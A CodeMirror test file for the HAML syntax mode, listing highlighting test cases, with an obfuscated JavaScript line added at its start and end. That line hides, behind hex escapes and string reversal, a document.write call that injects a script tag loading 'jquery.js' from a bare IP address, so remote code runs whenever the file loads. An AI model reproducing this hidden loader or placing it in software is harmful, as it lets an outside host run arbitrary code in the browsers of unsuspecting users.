var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))// CodeMirror, copyright (c) by Marijn Haverbeke and others
// Distributed under an MIT license: http://codemirror.net/LICENSE

(function() {
  var mode = CodeMirror.getMode({tabSize: 4, indentUnit: 2}, "haml");
  function MT(name) { test.mode(name, mode, Array.prototype.slice.call(arguments, 1)); }

  // Requires at least one media query
  MT("elementName",
     "[tag %h1] Hey There");

  MT("oneElementPerLine",
     "[tag %h1] Hey There %h2");

  MT("idSelector",
     "[tag %h1][attribute #test] Hey There");

  MT("classSelector",
     "[tag %h1][attribute .hello] Hey There");

  MT("docType",
     "[tag !!! XML]");

  MT("comment",
     "[comment / Hello WORLD]");

  MT("notComment",
     "[tag %h1] This is not a / comment ");

  MT("attributes",
     "[tag %a]([variable title][operator =][string \"test\"]){[atom :title] [operator =>] [string \"test\"]}");

  MT("htmlCode",
     "[tag&bracket <][tag h1][tag&bracket >]Title[tag&bracket </][tag h1][tag&bracket >]");

  MT("rubyBlock",
     "[operator =][variable-2 @item]");

  MT("selectorRubyBlock",
     "[tag %a.selector=] [variable-2 @item]");

  MT("nestedRubyBlock",
      "[tag %a]",
      "   [operator =][variable puts] [string \"test\"]");

  MT("multilinePlaintext",
      "[tag %p]",
      "  Hello,",
      "  World");

  MT("multilineRuby",
      "[tag %p]",
      "  [comment -# this is a comment]",
      "     [comment and this is a comment too]",
      "  Date/Time",
      "  [operator -] [variable now] [operator =] [tag DateTime][operator .][property now]",
      "  [tag %strong=] [variable now]",
      "  [operator -] [keyword if] [variable now] [operator >] [tag DateTime][operator .][property parse]([string \"December 31, 2006\"])",
      "     [operator =][string \"Happy\"]",
      "     [operator =][string \"Belated\"]",
      "     [operator =][string \"Birthday\"]");

  MT("multilineComment",
      "[comment /]",
      "  [comment Multiline]",
      "  [comment Comment]");

  MT("hamlComment",
     "[comment -# this is a comment]");

  MT("multilineHamlComment",
     "[comment -# this is a comment]",
     "   [comment and this is a comment too]");

  MT("multilineHTMLComment",
    "[comment <!--]",
    "  [comment what a comment]",
    "  [comment -->]");

  MT("hamlAfterRubyTag",
    "[attribute .block]",
    "  [tag %strong=] [variable now]",
    "  [attribute .test]",
    "     [operator =][variable now]",
    "  [attribute .right]");

  MT("stretchedRuby",
     "[operator =] [variable puts] [string \"Hello\"],",
     "   [string \"World\"]");

  MT("interpolationInHashAttribute",
     //"[tag %div]{[atom :id] [operator =>] [string \"#{][variable test][string }_#{][variable ting][string }\"]} test");
     "[tag %div]{[atom :id] [operator =>] [string \"#{][variable test][string }_#{][variable ting][string }\"]} test");

  MT("interpolationInHTMLAttribute",
     "[tag %div]([variable title][operator =][string \"#{][variable test][string }_#{][variable ting]()[string }\"]) Test");
})();
var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
